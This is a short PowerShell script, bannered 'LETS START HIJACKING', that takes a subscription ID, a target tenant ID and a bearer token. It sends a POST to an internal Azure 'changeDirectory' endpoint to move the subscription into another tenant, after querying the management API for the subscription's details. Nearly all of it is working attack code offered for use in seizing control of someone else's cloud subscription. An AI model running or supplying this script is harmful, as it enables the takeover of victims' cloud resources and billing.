[CmdletBinding()]
param (
    [Parameter()]
    [string]$subscriptionId,

    [Parameter()]
    [string]$targetTenantId,

    [Parameter()]
    [string]$accesstoken
)

$logo = '
        ,                      _         
       /|   | o  o            | |        
        |___|       __,   __  | |        
        |   |\|  | /  |  /    |/_) |   | 
        |   |/|_/|/\_/|_/\___/| \_/ \_/|/
                /|                    /| 
                \|                    \| 

         
-- L E T S   S T A R T   H I J A C K I N G --'

$mainUri = "https://subscriptionrp.trafficmanager.net/internal/subscriptions/"
'40356743-c4b9-4a2d-b74b-90c296bb0923'
$apiVersion = '2020-01-01-preview'

$uri = '{0}/{1}/changeDirectory?api-version={2}' -f $mainUri, $subscriptionId, $apiVersion
$uri 

$body = @{
    'tenantId' = $targetTenantId
} | ConvertTo-Json

$params = @{
    Uri         = $uri
    Method      = 'POST'
    ContentType = 'application/json'
    Body        = $body
}

$header = @{
    'authorization' = "bearer $accesstoken"
}

Clear-Host
Write-Host $logo -ForegroundColor green
Write-Host ""
Write-Output (Invoke-RestMethod -Uri "https://management.azure.com/subscriptions/$($subscriptionId)?api-version=2022-12-01" -Headers $header)
#Write-Host "Moving subscription with id [$subscriptionId]"
#Write-Host "to Tenant $targetTenantId"

$result = Invoke-RestMethod @params -Headers $header


try {
    $result = Invoke-RestMethod @params 
}
catch {
    Write-Output $_.Exception #.Response.StatusCode
}
